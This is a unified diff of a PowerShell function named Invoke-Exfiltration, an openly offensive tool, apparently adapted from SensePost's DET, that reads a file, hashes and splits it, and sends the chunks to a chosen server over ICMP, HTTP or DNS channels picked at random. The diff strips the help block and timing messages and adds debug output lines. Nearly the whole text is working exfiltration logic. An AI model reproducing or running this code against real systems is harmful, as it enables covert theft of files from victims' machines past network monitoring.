@@ -1,29 +1,4 @@
 function Invoke-Exfiltration {
-
-<#
-  .SYNOPSIS
-  Exfiltrates data over speified protocols.
-  .DESCRIPTION
-  PowerShell and Python data exfiltration tool.  Based heavily on the work done by SensePost (http://github.com/sensepost/det). Adopted by Rene Garcia, Nick Britton @nerbies, and Ryan Cobb @cobbr
-  .PARAMETER file
-  Full path of file to exfiltration
-  .PARAMETER key
-  AES encryption key
-  .PARAMETER port
-  Port for HTTP exfiltraton 
-  .PARAMETER type
-  Exfiltration method to use (dns, icmp, http)
-  .PARAMETER dns
-  DNS server to use for mock-dns exfiltration
-  .EXAMPLE
-  Invoke-EgressCheck -type icmp -server 127.0.0.1 -key HELLOWORLD -file c:\users\normaluser\desktop\file.txt
-  .LINK
-  https://github.com/nerbix/invoke-exfiltration
-  #>
-
-
-
-
     param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep)
     $bytes = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
@@ -52,8 +27,7 @@ function Invoke-Exfiltration {
     $remainder=$len%$split;
     $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
     $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
-    $datetime = Get-Date
-    Write-Host "Sending" $len "bytes -- started at" $datetime
+
 
     # determine exfil type and send data;
 	
@@ -68,17 +42,21 @@ function Invoke-Exfiltration {
             
             $str = $string.Substring($i * $Split, $Split);
             $sender = Get-Random -minimum 1 -maximum 4;
+            write-host $sender 
         
         If ($sender -eq '1') {
             $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            write-host $data
             $q = Send-ICMPPacket $data
             }
         If ($sender -eq '2') {
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
+            write-host $data
             $q = Send-HTTPRequest $data $IE
             }
         If ($sender -eq '3') {
             $data = $jobid + '|!|' + $i + '|!|' + 'D' + '|!|' + $str
+            write-host $data
             $q = Send-DNSRequest $server $data $jobid
             }
 
@@ -91,10 +69,12 @@ function Invoke-Exfiltration {
 
         If ($sender -eq '1') {
             $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            write-host $data
             $q = Send-ICMPPacket $data
             }
         If ($sender -eq '2') {
             $data = $jobid + '|!|' + $i + '|!|' + 'H' + '|!|' + $str
+            write-host $data
             $q = Send-HTTPRequest $data $IE
             }
 
@@ -102,11 +82,8 @@ function Invoke-Exfiltration {
     
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
-        $datetime = Get-Date
-        Write-Host "Completed at" $datetime
+        write-host $data
         $q = Send-ICMPPacket $data
-
-
         };
 
         
@@ -127,8 +104,6 @@ function Invoke-Exfiltration {
     
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
-        $datetime = Get-Date
-        Write-Host "Completed at" $datetime
         $q = Send-DNSRequest $server $data $jobid
        }	
 
@@ -150,8 +125,6 @@ function Invoke-Exfiltration {
 
         $i = $i + 1
         $data = $jobid + '|!|' + $i + '|!|DONE'
-        $datetime = Get-Date
-        Write-Host "Completed at" $datetime
         $q = Send-HTTPRequest $data $IE
         }
     
@@ -170,8 +143,7 @@ function Invoke-Exfiltration {
         };
     
         $i = $i + 1
-        $datetime = Get-Date
-        Write-Host "Completed at" $datetime
+        $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-ICMPPacket $data
         };
 }
